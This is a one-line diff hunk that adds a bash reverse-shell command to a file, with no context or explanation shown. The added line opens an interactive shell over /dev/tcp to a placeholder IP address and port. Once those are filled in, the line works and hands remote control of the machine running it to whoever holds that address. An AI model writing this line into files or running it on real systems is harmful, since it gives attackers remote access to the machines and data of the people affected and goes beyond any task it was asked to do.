@@ -1,0 +1,1 @@
+bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0>&1'
